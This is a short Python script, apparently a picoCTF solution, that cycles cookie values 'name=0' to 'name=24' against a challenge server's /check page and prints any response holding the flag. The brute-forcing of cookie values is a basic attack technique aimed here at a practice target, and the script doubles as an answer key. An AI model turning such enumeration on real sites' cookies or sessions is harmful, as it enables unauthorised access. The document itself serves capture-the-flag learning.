import requests

for i in range(25):
    cookie = 'name={}'.format(i) # "name=1", "name=2" etc.
    headers = {'Cookie':cookie}
    print(headers)
    r = requests.get('http://mercury.picoctf.net:17781/check', headers=headers)
    if ('picoCTF{' in r.text):
        print(r.text)